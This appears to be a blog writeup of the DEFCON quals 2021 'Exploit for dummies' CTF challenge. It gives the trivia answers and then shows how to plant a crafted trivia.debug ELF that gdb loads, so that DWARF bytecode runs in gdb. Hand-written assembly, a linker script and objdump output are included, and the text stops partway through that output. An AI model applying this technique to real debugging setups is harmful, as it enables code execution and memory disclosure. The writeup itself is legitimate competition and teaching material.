<!doctype html><html lang=en><head><title>DEFCON quals 2021 - Exploit for dummies challenge writeup</title><meta charset=UTF-8><meta content="width=device-width,initial-scale=1.0" name=viewport><link href=/fonts.css rel=stylesheet><link href=/style.css rel=stylesheet><body><main><nav><ul><li><a href=/>/index</a><li><a href=/b/>/blog</a><li><a href=https://github.com/xarkes>/github</a><li><a href=https://x.com/xarkes_>/x</a></ul></nav><div><h1>DEFCON quals 2021 - Exploit for dummies challenge writeup</h1><p><strong>Published on 2021-05-10</strong><p>Around 10 days ago was <a href=https://oooverflow.io/dc-ctf-2021-quals/>DEFCON qualifiers</a> and I had a chance to take a look at the challenges. My eyes stopped on "Exploit for dummies" as I recognised myself in the term "dummy" and hoped I could solve this one.<p>The challenge was marked as "shellcoding" and believe it or not it will deal with <a href=https://en.wikipedia.org/wiki/DWARF>DWARF</a> debugging data format.</p><span id=continue-reading></span><h2 id=a-trivia-quizz>A trivia quizz</h2><p>We are given an ELF binary named <code>trivia</code> which first reads <code>../../flag</code> and stores it at a random location in memory thanks to a weird request to <code>mmap</code>. After that, it reads the <code>questions.txt</code> file to ask questions from various categories to the player.<p>When the player reaches a score of 5000, it asks the player to save their name in a file on the filesystem. There are not many checks about the filename, and thus it is possible to trigger a segfault when trying to overwrite the value of a non writable file, e.g. <code>questions.txt</code>, although some checks are done with <a href=https://linux.die.net/man/2/access>access</a>. The name itself (which would be stored in the file) is read with the function <a href=https://linux.die.net/man/3/fgets>fgets</a> which reads at most <code>0x3ff</code> bytes so that means we can write any file in the current directory of size <code><= 1023</code> as long as it contains no <code>\n</code> character (which would interrupt the reading of <code>fgets</code>).<p>When connecting to the remote target, we get the following:<pre class=language-console data-lang=console style=color:#c0c5ce;background-color:#2b303b><code class=language-console data-lang=console><span>$ nc exploit-for-dummies.challenges.ooo 5000
</span><span>Ok, listen... here is the deal.
</span><span>Now I am going to let you interact with a program.
</span><span>You need to get the flag (that's the goal in a CTF, in case you did not notice that)
</span><span>But I am here to help you. So, if you make the program crash and you give me the address of
</span><span>the flag, I am going to get it out of the memory and print it for you.
</span><span>Isn't it nice?
</span><span>
</span><span>Ready? Here we go... just press ENTER and I'll spawn the service up for you.
</span><span>
</span><span>starting...
</span><span>cd ./tmp/dir_2663717
</span><span>./trivia
</span><span>--[ Score: 0 ]--
</span><span>
</span><span>Secret Passwords for 200:
</span><span>Super-secure launching code for Nuclear silos during the cold war.
</span></code></pre><p>We learn that the wrapper running remotely will handle a crash in the program and give us the memory content at a given address. So we have to gather all the questions, and answer them correctly. Here are the questions followed by their expected answer right below:<pre class=language-text data-lang=text style=color:#c0c5ce;background-color:#2b303b><code class=language-text data-lang=text><span>OOO is using a log-decay dynamic scoring formula in which the number of teams who solved a challenge is multiplied by which constant?
</span><span>0.08
</span><span>He once won a game of Connect Four in three moves, and inspired a Facebook master password
</span><span>Chuck Norris
</span><span>Which American group recorded a song named Ooo?
</span><span>!!!
</span><span>It was the first trivia question in the 2006 DEF CON quals. It all started like this: "Hack the ...."
</span><span>planet
</span><span>The famous president Skroob luggage combination
</span><span>12345
</span><span>What is the most common meaning of the OOO abbreviation according to wikipedia?
</span><span>Out of Office
</span><span>What was the first year in which OOO organized the defcon CTF?
</span><span>2018
</span><span>Level 1 questions make CISSPs turn red, Level 2 make SANS Fellows cry in frustration. We are talking of course of the CTF organized by...
</span><span>ddtek
</span><span>He described a penicillin shot in the ass as  "the worst thing that has ever happened to me". He is the one and only..
</span><span>Kevin Mitnick
</span><span>Default passwords for IBM 8225 systems
</span><span>A52896nG93096a
</span><span>It is 2008. It is the end of the cache as we know it. Or...
</span><span>64K Should Be Good Enough For Anyone
</span><span>When David Lightman hacked into the school system to change his grade in Biology 2, the school password was..
</span><span>pencil
</span><span>In this year, IDA Pro 5.0 introduced the first GUI.
</span><span>2006
</span><span>They took over the Defcon CTF organization in 2002, and defined the game as we all know and love today.
</span><span>Ghetto Hackers
</span><span>DNS guru, and the first person Dan called in 2008 to discuss its newly discovered DNS flaw.
</span><span>Paul Vixie
</span><span>What is the name of the legitbs 9-bit middle endian architecture?
</span><span>Clemency
</span><span>Its three-letter acronym is used by astronomers to indicate double neutron stars
</span><span>Domain Name System
</span><span>The name of the university from which he obtained his bachelor's degree.
</span><span>Santa Clara University
</span><span>Smashing the Stack for Fun and Profit. We all know it by heart, right? But do you remember its last sentence?
</span><span>Use the source d00d
</span><span>In 1992, the Zero Wing videogame shocked the world with the phrase:
</span><span>All your base are belong to us
</span><span>Super-secure launching code for Nuclear silos during the cold war.
</span><span>00000000
</span><span>In the defcon quals 2020, what was the highest ranked team that had three letters O in its name?
</span><span>YOKARO-MON
</span><span>Who (person) was the famous Defcon CTF organizer who said "The Scoring System determines the quality of the game"
</span><span>Caezar
</span><span>What was the first column in the first Jeopardy qualification board introduced by Kenshoto in 2006?
</span><span>Binary L33tness
</span><span>We are obviously talking about Dan ...
</span><span>kaminsky
</span></code></pre><p>After making a quick and dirty script to answer the questions, we can manage to get asked which file to save, specify we want to overwrite <code>questions.txt</code> and confirm that after crashing the wrapper launches a gdb session with <code>gdb -c core trivia</code> and executes <code>x/s</code> with our provided address. We also learn the address format should start with <code>0x</code> and be at most 16 characters.<p>Okay, so what can we do now? After the command is executed, the wrapper finishes and closes the remote connection, so it seems there is no way we can dump multiple addresses. We know we can write a file to the filesystem before triggering a segfault by playing 2 games in a row. We tried to overwrite a file <code>core</code> to make gdb believe we are in another state and somehow manage to do things later on like reading the file from the filesystem directly, as the flag is either stored in the program memory which is dumped in <code>core</code> after the segmentation fault, or in the <code>../../flag</code> file, but it seemed it would get overwritten by the generated core file. We also tried to overwrite the binary itself so upon invocation of <code>gdb</code> it would have loaded a custom ELF file, but overwriting the file was not possible.<h2 id=gnu-debuglink-to-the-rescue>.gnu_debuglink to the rescue</h2><p>After calling <code>strace</code> on gdb and running it on our binary we can see that it tries to load the file named <code>trivia.debug</code> in the current directory.<pre style=color:#c0c5ce;background-color:#2b303b><code><span>$ strace gdb trivia 2>&1 | grep $PWD
</span><span>...
</span><span>openat(AT_FDCWD, "/share/trivia", O_RDONLY) = 13
</span><span>readlink("/share/", 0x7ffc1670f6b0, 1023) = -1 EINVAL (Invalid argum
</span><span>faccessat2(AT_FDCWD, "/share/", F_OK, AT_EACCESS) = 0
</span><span>openat(AT_FDCWD, "/share/trivia.debug", O_RDONLY|O_CLOEXEC) = 14)
</span><span>...
</span></code></pre><p>As we can learn from gdb's <a href=https://sourceware.org/gdb/onlinedocs/gdb/Separate-Debug-Files.html>documentation</a> the <code>.debug</code> files are usually used to store extra debug symbols. The original binary writes the filename in a section named <code>.gnu_debuglink</code>. This section also contains a CRC32 checksum in order to verify that the file being loaded matches what the original binary expects to see.<p>If I had been more careful, I could have spotted it while checking the sections of the binary:<pre style=color:#c0c5ce;background-color:#2b303b><code><span>$ readelf -W -S trivia
</span><span>...
</span><span>  [28] .gnu_debuglink    PROGBITS        0000000000000000 00310c 000014 00      0   0  4
</span><span>...
</span></code></pre><p>Okay so that's great, it means we can write an ELF file of at most 1023 bytes named <code>trivia.debug</code> and this file will get loaded by gdb. Well, actually we also have to make sure the CRC matches the one that is hardcoded in the <code>.gnu_debuglink</code> section, but we'll think about that later.<p>Now my intuition was that I would have the possibility to write a debug symbol that would point directly to some place in memory and dump the flag like this. But well, the flag is allocated and stored at a random position in memory so it seemed not possible, especially since we can only trigger the call to gdb once.<p>However this debug file thingy reminded me of a step in the <a href=https://www.sstic.org/2019/challenge/>SSTIC challenge 2019</a> that would implement a whole cryptographic algorithm using only DWARF debug information.<h2 id=creating-custom-dwarf-information>Creating custom DWARF information</h2><p>After I reminded this, I quickly spotted the function <a href=https://github.com/bminor/binutils-gdb/blob/master/gdb/dwarf2/expr.c#L548><code>dwarf_expr_context::execute_stack_op</code></a> in <code>gdb</code> source code to confirm that there is indeed a whole virtual machine for DWARF, and tried to find a way to reach it from the <code>x/s</code> command.<p>That was not easy and at some point I found the amazing DWARF v4 <a href=http://dwarfstd.org/doc/DWARF4.pdf>specification</a> which says:<blockquote><p>A DWARF procedure is represented by any kind of debugging information entry that has a DW_AT_location attribute.</blockquote><p>So I was more confident there would be a way to actually execute code by calling <code>x/s</code> and I started playing around by crafting ELF files.<h3 id=crafting-small-elf-files>Crafting small ELF files</h3><p>First things first, I wanted to make sure my files would fit in 1023 bytes as that would be our goal ultimately. And since I also wanted to manually craft the sections that would contain the DWARF information, I decided to make a linker script that would remove any unused section.<pre style=color:#c0c5ce;background-color:#2b303b><code><span>OUTPUT_FORMAT(elf64-x86-64)
</span><span>SECTIONS
</span><span>{
</span><span>  .debug_info : {
</span><span>    debug_info.o(.debug_info)
</span><span>  }
</span><span>  .debug_abbrev : {
</span><span>    debug_abbrev.o(.debug_abbrev)
</span><span>  }
</span><span>  .debug_str : {
</span><span>    debug_str.o(.debug_str)
</span><span>  }
</span><span>  /DISCARD/ : {
</span><span>    *(.text)
</span><span>    *(.bss)
</span><span>
</span><span>    *(.debug_str)
</span><span>    *(.debug_abbrev)
</span><span>    *(.debug_info)
</span><span>
</span><span>    *(.debug_line)
</span><span>    *(.debug_aranges)
</span><span>    *(.eh_frame)
</span><span>    *(.note.gnu.property)
</span><span>    *(.comment)
</span><span>  }
</span><span>}
</span></code></pre><p>I even removed the <code>.text</code> section as I didn't plan to execute any code, so in the end only the <code>.symtab</code>, <code>.strtab</code> and <code>.shstrtab</code> sections remained and couldn't be removed with the linker script but that was not an issue as my file was already below 1023 bytes.<p>The <code>.o</code> files would be simple asm files <code>.s</code> which contain either raw content with <code>.incbin</code> or raw data with <code>.byte</code> or <code>.asciz</code>.<pre class=language-asm data-lang=asm style=color:#c0c5ce;background-color:#2b303b><code class=language-asm data-lang=asm><span style=color:#8fa1b3>.</span><span style=color:#96b5b4>section </span><span style=color:#8fa1b3>.debug_info
</span><span style=color:#8fa1b3>.</span><span style=color:#96b5b4>incbin </span><span style=color:#a3be8c>"debug_info.raw"
</span></code></pre><p><pre class=language-asm data-lang=asm style=color:#c0c5ce;background-color:#2b303b><code class=language-asm data-lang=asm><span style=color:#8fa1b3>.</span><span style=color:#96b5b4>section </span><span style=color:#8fa1b3>.debug_str
</span><span style=color:#8fa1b3>.asciz </span><span style=color:#a3be8c>"mysym"
</span><span style=color:#8fa1b3>.</span><span style=color:#96b5b4>byte </span><span style=color:#d08770>0
</span></code></pre><h3 id=understanding-dwarf>Understanding DWARF</h3><p>Thanks to the command <code>objdump -g testfile</code> it was possible to see that the relevant DWARF information are loaded mainly from 3 different sections named <code>.debug_info</code>, <code>.debug_abbrev</code> and <code>.debug_str</code>.<pre class=language-console data-lang=console style=color:#c0c5ce;background-color:#2b303b><code class=language-console data-lang=console><span>$ objdump -g tiny.o
</span><span>
</span><span>tiny.o:     file format elf64-x86-64
</span><span>
</span><span>Contents of the .debug_info section (loaded from tiny.o):
</span><span>
</span><span>  Compilation Unit @ offset 0x0:
</span><span>   Length:        0x75 (32-bit)
</span><span>   Version:       4
</span><span>   Abbrev Offset: 0x0
</span><span>   Pointer Size:  8
</span><span> &LT0>&LTb>: Abbrev Number: 1 (DW_TAG_compile_unit)
</span><span>    &LTc>   DW_AT_producer    : (indirect string, offset: 0x41): GNU C17 10.2.0 -mtune=generic -march=x86-64 -g -fno-pic -fno-stack-protector
</span><span>    &LT10>   DW_AT_language    : 12	(ANSI C99)
</span><span>    &LT11>   DW_AT_name        : (indirect string, offset: 0x3a): tiny.c
</span><span>    &LT15>   DW_AT_comp_dir    : (indirect string, offset: 0x12): /share/
</span><span>    &LT19>   DW_AT_low_pc      : 0x0
</span><span>    &LT21>   DW_AT_high_pc     : 0xb
</span><span>    &LT29>   DW_AT_stmt_list   : 0x0
</span><span> &LT1>&LT2d>: Abbrev Number: 2 (DW_TAG_enumeration_type)
</span><span>    &LT2e>   DW_AT_name        : (indirect string, offset: 0x0): chat
</span><span>    &LT32>   DW_AT_encoding    : 7	(unsigned)
</span><span>    &LT33>   DW_AT_byte_size   : 4
</span><span>    &LT34>   DW_AT_type        : &LT0x4c>
</span><span>    &LT38>   DW_AT_decl_file   : 1
</span><span>    &LT39>   DW_AT_decl_line   : 1
</span><span>    &LT3a>   DW_AT_decl_column : 6
</span><span>    &LT3b>   DW_AT_sibling     : &LT0x4c>
</span><span> &LT2>&LT3f>: Abbrev Number: 3 (DW_TAG_enumerator)
</span><span>    &LT40>   DW_AT_name        : (indirect string, offset: 0x5): first
</span><span>    &LT44>   DW_AT_const_value : 51
</span><span> &LT2>&LT45>: Abbrev Number: 3 (DW_TAG_enumerator)
</span><span>    &LT46>   DW_AT_name        : (indirect string, offset: 0xb): second
</span><span>    &LT4a>   DW_AT_const_value : 52
</span><span> &LT2>&LT4b>: Abbrev Number: 0
</span><span> &LT1>&LT4c>: Abbrev Number: 4 (DW_TAG_base_type)
</span><span>    &LT4d>   DW_AT_byte_size   : 4
</span><span>    &LT4e>   DW_AT_encoding    : 7	(unsigned)
</span><span>    &LT4f>   DW_AT_name        : (indirect string, offset: 0x2d): unsigned int
</span><span>
</span><span> [...] ; snip
</span><span>
</span><span>Contents of the .debug_abbrev section (loaded from tiny.o):
</span><span>
</span><span>  Number TAG (0x0)
</span><span>   1      DW_TAG_compile_unit    [has children]
</span><span>    DW_AT_producer     DW_FORM_strp
</span><span>    DW_AT_language     DW_FORM_data1
</span><span>    DW_AT_name         DW_FORM_strp
</span><span>    DW_AT_comp_dir     DW_FORM_strp
</span><span>    DW_AT_low_pc       DW_FORM_addr
</span><span>    DW_AT_high_pc      DW_FORM_data8
</span><span>    DW_AT_stmt_list    DW_FORM_sec_offset
</span><span>    DW_AT value: 0     DW_FORM value: 0
</span><span>   2      DW_TAG_enumeration_type    [has children]
</span><span>    DW_AT_name         DW_FORM_strp
</span><span>    DW_AT_encoding     DW_FORM_data1
</span><span>    DW_AT_byte_size    DW_FORM_data1
</span><span>    DW_AT_type         DW_FORM_ref4
</span><span>    DW_AT_decl_file    DW_FORM_data1
</span><span>    DW_AT_decl_line    DW_FORM_data1
</span><span>    DW_AT_decl_column  DW_FORM_data1
</span><span>    DW_AT_sibling      DW_FORM_ref4
</span><span>    DW_AT value: 0     DW_FORM value: 0
</span><span>   3      DW_TAG_enumerator    [no children]
</span><span>    DW_AT_name         DW_FORM_strp
</span><span>    DW_AT_const_value  DW_FORM_data1
</span><span>    DW_AT value: 0     DW_FORM value: 0
</span><span>   4      DW_TAG_base_type    [no children]
</span><span>    DW_AT_byte_size    DW_FORM_data1
</span><span>    DW_AT_encoding     DW_FORM_data1
</span><span>    DW_AT_name         DW_FORM_strp
</span><span>    DW_AT value: 0     DW_FORM value: 0
</span><span>
</span><span> [...] ; snip
</span><span>
</span><span>Contents of the .debug_str section (loaded from tiny.o):
</span><span>
</span><span>  0x00000000 63686174 00666972 73740073 65636f6e chat.first.secon
</span><span>  0x00000010 64002f73 68617265 2f64756d 6d696573 d./share/dummies
</span><span>  0x00000020 5f776f72 6b005f73 74617274 00756e73 _work._start.uns
</span><span>  0x00000030 69676e65 6420696e 74007469 6e792e63 igned int.tiny.c
</span><span>  0x00000040 00474e55 20433137 2031302e 322e3020 .GNU C17 10.2.0
</span><span>  0x00000050 2d6d7475 6e653d67 656e6572 6963202d -mtune=generic -
</span><span>  0x00000060 6d617263 683d7838 362d3634 202d6720 march=x86-64 -g
</span><span>  0x00000070 2d666e6f 2d706963 202d666e 6f2d7374 -fno-pic -fno-st
</span><span>  0x00000080 61636b2d 70726f74 6563746f 7200     ack-protector.
</span></code></pre><p>We understand that the <code>.debug_abbrev</code> section is used to describe some structures or abbrevations, and that the <code>.debug_info</code> contains the actual debugging information which refers to structures from the aforementioned section. The <code>.debug_str</code> is used to contain the debug string information such as variable names, file names, etc.<p>It means that we can declare any structure in <code>.debug_abbrev</code> with any possible content, and we can refer to the created structure in <code>.debug_info</code> in a way to say "hey there's a debug symbol available of the form that is described in the abbrev section and here is its content".<p>From there I needed to solve two things:<ol><li>Generate a symbol that upon printing would execute a DWARF bytecode<li>Make sure that symbol is reachable from any context</ol><p>For the first thing, as we briefly mentioned before, creating a <code>DW_TAG_variable</code> with a <code>DW_AT_name</code> pointing to the name I want to give to my symbol, and with a <code>DW_AT_location</code> field allows to execute DWARF bytecode. I can write any <code>DW_OP_xxx</code> opcode in my structure information, and during debugging it would change the value of what <code>x/s mysym</code> would print, or even better yield that my opcode is invalid. But I only managed to make it work when creating a local variable and calling <code>x/s</code> from a context for which the variable was actually reachable.<p>For the second thing, I realised that using a field with a <code>DW_TAG_enumerator</code> with a <code>DW_AT_const_value</code> attribute would allow me to print it from any context (while the variable is reachable only if the debugger is stopped in its scope). I couldn't find how to enlarge the scope of the variable so I decided to go with the enumerator, however it seemed not compatible with <code>DW_AT_location</code>. When calling <code>x/s mysym</code> it would just say that the symbol does not exist, exactly as with the <code>DW_TAG_variable</code> as seen just before.<p>After a while I managed to do the following trick which consists in writing in the <code>.debug_info</code> first the <code>DW_TAG_variable</code> with a <code>DW_AT_location</code> attribute pointing to the name <code>mysym</code> and then a second entry <code>DW_TAG_variable</code> with a <code>DW_AT_const_value</code> also pointing to the name <code>mysym</code>. My understanding is that thanks to the second entry, gdb is able to find the symbol when doing <code>x/s mysym</code> (probably thanks to the attribute <code>DW_AT_const_value</code>) but that it will fetch the first occurrence of the symbol (the one with <code>DW_AT_location</code>) when actually getting the value.<p>It seems easy when written in a few sentences but it took me quite a while to figure this trick out. I'm pretty sure there are smarter ways to do it, but well, the challenge is named "exploit for dummies" after all, so I thought doing so would be completely appropriate.<p>In the end I came up with the following files:<pre class=language-asm data-lang=asm style=color:#c0c5ce;background-color:#2b303b><code class=language-asm data-lang=asm><span style=color:#8fa1b3>.</span><span style=color:#96b5b4>section </span><span style=color:#8fa1b3>.debug_abbrev
</span><span style=color:#8fa1b3>## Type </span><span style=color:#d08770>1
</span><span style=color:#8fa1b3># Type ID
</span><span style=color:#8fa1b3>.</span><span style=color:#96b5b4>byte </span><span style=color:#d08770>0x01
</span><span style=color:#8fa1b3># Content
</span><span style=color:#8fa1b3>.</span><span style=color:#96b5b4>byte </span><span style=color:#d08770>0x11</span><span>, </span><span style=color:#d08770>0x01</span><span>, </span><span style=color:#d08770>0x25</span><span>, </span><span style=color:#d08770>0x0e</span><span>, </span><span style=color:#d08770>0x13</span><span>, </span><span style=color:#d08770>0x0b</span><span>, </span><span style=color:#d08770>0x03</span><span>, </span><span style=color:#d08770>0x0e</span><span>, </span><span style=color:#d08770>0x1b</span><span>, </span><span style=color:#d08770>0x0e</span><span>, </span><span style=color:#d08770>0x11</span><span>, </span><span style=color:#d08770>0x01</span><span>, </span><span style=color:#d08770>0x12</span><span>, </span><span style=color:#d08770>0x07</span><span>, </span><span style=color:#d08770>0x10</span><span>, </span><span style=color:#d08770>0x17
</span><span style=color:#8fa1b3># End marker
</span><span style=color:#8fa1b3>.</span><span style=color:#96b5b4>byte </span><span style=color:#d08770>0x00</span><span>, </span><span style=color:#d08770>0x00
</span><span>
</span><span style=color:#8fa1b3>## Type </span><span style=color:#d08770>3
</span><span style=color:#8fa1b3># Type ID
</span><span style=color:#8fa1b3>.</span><span style=color:#96b5b4>byte </span><span style=color:#d08770>0x03
</span><span style=color:#8fa1b3># Field </span><span style=color:#d08770>0 </span><span style=color:#8fa1b3>(DW_TAG_variable)
</span><span style=color:#8fa1b3>.</span><span style=color:#96b5b4>byte </span><span style=color:#d08770>0x34</span><span>, </span><span style=color:#d08770>0x00
</span><span style=color:#8fa1b3># Field </span><span style=color:#d08770>1 </span><span style=color:#8fa1b3>(DW_AT_name</span><span>, </span><span style=color:#8fa1b3>DW_FORM_strp) string pointer to symbol name
</span><span style=color:#8fa1b3>.</span><span style=color:#96b5b4>byte </span><span style=color:#d08770>0x03</span><span>, </span><span style=color:#d08770>0x0e
</span><span style=color:#8fa1b3># Field </span><span style=color:#d08770>2 </span><span style=color:#8fa1b3>(DW_AT_const_value</span><span>, </span><span style=color:#8fa1b3>DW_AT_FORM_data1) constant on </span><span style=color:#d08770>1 </span><span style=color:#96b5b4>byte
</span><span style=color:#8fa1b3>.</span><span style=color:#96b5b4>byte </span><span style=color:#d08770>0x1c</span><span>, </span><span style=color:#d08770>0x0b
</span><span style=color:#8fa1b3># End marker
</span><span style=color:#8fa1b3>.</span><span style=color:#96b5b4>byte </span><span style=color:#d08770>0x00</span><span>, </span><span style=color:#d08770>0x00
</span><span>
</span><span style=color:#8fa1b3>## Type </span><span style=color:#d08770>4
</span><span style=color:#8fa1b3># Type ID
</span><span style=color:#8fa1b3>.</span><span style=color:#96b5b4>byte </span><span style=color:#d08770>0x04
</span><span style=color:#8fa1b3># Field </span><span style=color:#d08770>0 </span><span style=color:#8fa1b3>(DW_TAG_variable)
</span><span style=color:#8fa1b3>.</span><span style=color:#96b5b4>byte </span><span style=color:#d08770>0x34</span><span>, </span><span style=color:#d08770>0x00
</span><span style=color:#8fa1b3># Field </span><span style=color:#d08770>1 </span><span style=color:#8fa1b3>(DW_AT_name</span><span>, </span><span style=color:#8fa1b3>DW_FORM_strp) string pointer to symbol name
</span><span style=color:#8fa1b3>.</span><span style=color:#96b5b4>byte </span><span style=color:#d08770>0x03</span><span>, </span><span style=color:#d08770>0x0e
</span><span style=color:#8fa1b3># Field </span><span style=color:#d08770>2 </span><span style=color:#8fa1b3>(DW_AT_location</span><span>, </span><span style=color:#8fa1b3>DW_FORM_exprloc) dwarf subprogram to compute location
</span><span style=color:#8fa1b3>.</span><span style=color:#96b5b4>byte </span><span style=color:#d08770>0x02</span><span>, </span><span style=color:#d08770>0x18
</span><span style=color:#8fa1b3># End marker
</span><span style=color:#8fa1b3>.</span><span style=color:#96b5b4>byte </span><span style=color:#d08770>0x00</span><span>, </span><span style=color:#d08770>0x00
</span><span>
</span><span style=color:#8fa1b3># End marker
</span><span style=color:#8fa1b3>.</span><span style=color:#96b5b4>byte </span><span style=color:#d08770>0x00
</span></code></pre><p><pre class=language-asm data-lang=asm style=color:#c0c5ce;background-color:#2b303b><code class=language-asm data-lang=asm><span style=color:#8fa1b3>.</span><span style=color:#96b5b4>section </span><span style=color:#8fa1b3>.debug_info
</span><span style=color:#8fa1b3># </span><span style=color:#96b5b4>section </span><span style=color:#8fa1b3>length
</span><span style=color:#8fa1b3>.</span><span style=color:#96b5b4>byte </span><span style=color:#d08770>0x37</span><span>+</span><span style=color:#8fa1b3>SHELLCODE_SIZE</span><span>, </span><span style=color:#d08770>0x00</span><span>, </span><span style=color:#d08770>0x00</span><span>, </span><span style=color:#d08770>0x00
</span><span style=color:#8fa1b3># dwarf version
</span><span style=color:#8fa1b3>.</span><span style=color:#96b5b4>byte </span><span style=color:#d08770>0x04</span><span>, </span><span style=color:#d08770>0x00
</span><span style=color:#8fa1b3># debug_abbrev offset
</span><span style=color:#8fa1b3>.</span><span style=color:#96b5b4>byte </span><span style=color:#d08770>0x00</span><span>, </span><span style=color:#d08770>0x00</span><span>, </span><span style=color:#d08770>0x00</span><span>, </span><span style=color:#d08770>0x00
</span><span style=color:#8fa1b3># pointer size
</span><span style=color:#8fa1b3>.</span><span style=color:#96b5b4>byte </span><span style=color:#d08770>0x08
</span><span>
</span><span style=color:#8fa1b3>### Entries
</span><span style=color:#8fa1b3>## Entry </span><span style=color:#d08770>1 </span><span style=color:#8fa1b3>(type </span><span style=color:#d08770>1</span><span style=color:#8fa1b3>)
</span><span style=color:#8fa1b3># Tag (entry number </span><span style=color:#b48ead>in </span><span style=color:#8fa1b3>.debug_abbrev </span><span style=color:#96b5b4>section</span><span style=color:#8fa1b3>)
</span><span style=color:#8fa1b3>.</span><span style=color:#96b5b4>byte </span><span style=color:#d08770>0x01
</span><span style=color:#8fa1b3># Data
</span><span style=color:#8fa1b3>.</span><span style=color:#96b5b4>byte </span><span style=color:#d08770>0x2d</span><span>, </span><span style=color:#d08770>0x00</span><span>, </span><span style=color:#d08770>0x00</span><span>, </span><span style=color:#d08770>0x00</span><span>, </span><span style=color:#d08770>0x0c</span><span>, </span><span style=color:#d08770>0x00</span><span>, </span><span style=color:#d08770>0x00</span><span>, </span><span style=color:#d08770>0x00</span><span>, </span><span style=color:#d08770>0x00</span><span>, </span><span style=color:#d08770>0x12</span><span>, </span><span style=color:#d08770>0x00</span><span>, </span><span style=color:#d08770>0x00</span><span>, </span><span style=color:#d08770>0x00</span><span>, </span><span style=color:#d08770>0x00</span><span>, </span><span style=color:#d08770>0x10</span><span>, </span><span style=color:#d08770>0x00</span><span>, </span><span style=color:#d08770>0x00</span><span>, </span><span style=color:#d08770>0x00</span><span>, </span><span style=color:#d08770>0x00</span><span>, </span><span style=color:#d08770>0x00</span><span>, </span><span style=color:#d08770>0x00</span><span>, </span><span style=color:#d08770>0x0b</span><span>, </span><span style=color:#d08770>0x00</span><span>, </span><span style=color:#d08770>0x00</span><span>, </span><span style=color:#d08770>0x00</span><span>, </span><span style=color:#d08770>0x00</span><span>, </span><span style=color:#d08770>0x00</span><span>, </span><span style=color:#d08770>0x00</span><span>, </span><span style=color:#d08770>0x00</span><span>, </span><span style=color:#d08770>0x00</span><span>, </span><span style=color:#d08770>0x00</span><span>, </span><span style=color:#d08770>0x00</span><span>, </span><span style=color:#d08770>0x00
</span><span>
</span><span style=color:#8fa1b3>## Entry </span><span style=color:#d08770>2 </span><span style=color:#8fa1b3>(type </span><span style=color:#d08770>4</span><span style=color:#8fa1b3>)
</span><span style=color:#8fa1b3># Tag
</span><span style=color:#8fa1b3>.</span><span style=color:#96b5b4>byte </span><span style=color:#d08770>0x04
</span><span style=color:#8fa1b3># String pointer (offset </span><span style=color:#d08770>5 </span><span style=color:#8fa1b3>of .debug_str)
</span><span style=color:#8fa1b3>.</span><span style=color:#96b5b4>byte </span><span style=color:#d08770>0x05</span><span>, </span><span style=color:#d08770>0x00</span><span>, </span><span style=color:#d08770>0x00</span><span>, </span><span style=color:#d08770>0x00
</span><span style=color:#8fa1b3># Shellcode size
</span><span style=color:#8fa1b3>.</span><span style=color:#96b5b4>byte </span><span style=color:#8fa1b3>SHELLCODE_SIZE
</span><span style=color:#8fa1b3># Shellcode data
</span><span style=color:#8fa1b3>.</span><span style=color:#96b5b4>byte </span><span style=color:#8fa1b3>SHELLCODE
</span><span>
</span><span style=color:#8fa1b3>## Entry </span><span style=color:#d08770>3 </span><span style=color:#8fa1b3>(type </span><span style=color:#d08770>3</span><span style=color:#8fa1b3>)
</span><span style=color:#8fa1b3># Tag
</span><span style=color:#8fa1b3>.</span><span style=color:#96b5b4>byte </span><span style=color:#d08770>0x03
</span><span style=color:#8fa1b3># String pointer (offset </span><span style=color:#d08770>5 </span><span style=color:#8fa1b3>of .debug_str)
</span><span style=color:#8fa1b3>.</span><span style=color:#96b5b4>byte </span><span style=color:#d08770>0x05</span><span>, </span><span style=color:#d08770>0x00</span><span>, </span><span style=color:#d08770>0x00</span><span>, </span><span style=color:#d08770>0x00
</span><span style=color:#8fa1b3># Constant value
</span><span style=color:#8fa1b3>.</span><span style=color:#96b5b4>byte </span><span style=color:#d08770>0x33
</span><span>
</span><span style=color:#8fa1b3>## End marker
</span><span style=color:#8fa1b3>.</span><span style=color:#96b5b4>byte </span><span style=color:#d08770>0x00</span><span>, </span><span style=color:#d08770>0x00
</span></code></pre><p>The first entry used as a <code>DW_TAG_compile_unit</code> does not seem useful, but I had troubles with gdb segfaulting when not providing it, so I preferred keeping it.<p>We will come up to the shellcode part in the next section, however this provides the following debug information:<pre class=language-console data-lang=console style=color:#c0c5ce;background-color:#2b303b><code class=language-console data-lang=console><span>$ objdump -g trivia.debug
</span><span>
</span><span>trivia.debug:     file format elf64-x86-64
</span><span>
</span><span>Contents of the .debug_info section (loaded from trivia.debug):
</span><span>
</span><span>  Compilation Unit @ offset 0x0:
</span><span>   Length:        0x75 (32-bit)
</span><span>   Version:       4
</span><span>   Abbrev Offset: 0x0
</span><span>   Pointer Size:  8
</span><span> &LT0>&LTb>: Abbrev Number: 1 (DW_TAG_compile_unit)
</span><span>    &LTc>   DW_AT_producer    : (indirect string, offset: 0x2d): GNU C17 10.2.0 -mtune=generic -march=x86-64 -g -fno-stack-protector
</span><span>    &LT10>   DW_AT_language    : 12	(ANSI C99)
</span><span>    &LT11>   DW_AT_name        : (indirect string, offset: 0x0): chat
</span><span>    &LT15>   DW_AT_comp_dir    : (indirect string, offset: 0x12): /share/dummies_work
</span><span>    &LT19>   DW_AT_low_pc      : 0x1000
</span><span>    &LT21>   DW_AT_high_pc     : 0xb
</span><span>    &LT29>   DW_AT_stmt_list   : 0x0
</span><span> &LT1>&LT2d>: Abbrev Number: 4 (DW_TAG_variable)
</span><span>    &LT2e>   DW_AT_name        : (indirect string, offset: 0x5): first
</span><span>    &LT32>   DW_AT_location    : 2 byte block: 77	0 (DW_OP_breg7 (rsp): 0)
</span><span> &LT1>&LT71>: Abbrev Number: 3 (DW_TAG_variable)
</span><span>    &LT72>   DW_AT_name        : (indirect string, offset: 0x5): first
</span><span>    &LT76>   DW_AT_const_value : 51
</span><span> &LT1>&LT77>: Abbrev Number: 0
</span><span>
</span><span>Contents of the .debug_abbrev section (loaded from trivia.debug):
</span><span>
</span><span>  Number TAG (0x0)
</span><span>   1      DW_TAG_compile_unit    [has children]
</span><span>    DW_AT_producer     DW_FORM_strp
</span><span>    DW_AT_language     DW_FORM_data1
</span><span>    DW_AT_name         DW_FORM_strp
</span><span>    DW_AT_comp_dir     DW_FORM_strp
</span><span>    DW_AT_low_pc       DW_FORM_addr
</span><span>    DW_AT_high_pc      DW_FORM_data8
</span><span>    DW_AT_stmt_list    DW_FORM_sec_offset
</span><span>    DW_AT value: 0     DW_FORM value: 0
</span><span>   3      DW_TAG_variable    [no children]
</span><span>    DW_AT_name         DW_FORM_strp
